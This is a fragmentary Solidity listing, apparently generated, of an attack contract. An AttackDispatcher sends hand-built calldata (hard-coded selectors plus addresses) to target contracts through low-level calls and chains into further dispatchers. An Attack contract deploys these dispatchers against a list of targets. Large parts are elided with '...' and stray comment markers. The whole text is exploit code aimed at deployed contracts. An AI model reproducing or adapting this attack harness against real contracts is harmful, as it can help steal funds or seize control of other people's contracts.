    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                 ...
                 */
                bytes memory data = abi.encodePacked(hex"4fb2e45d000000000000000000000000", (manager.__id_to_address(5)));
                uint value = 0x0;
            ...
            if (id == 5) {
                 ...
                 */
                bytes memory data = abi.encodePacked(hex"9d02a866000000000000000000000000", (manager.__id_to_address(2)));
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                ...
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(5));
                via._dispatch();
            }
        }
...
contract Attack is AttackManager {
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        subs[5] = new AttackDispatcher{value: 0 }(5, _targets);
    }
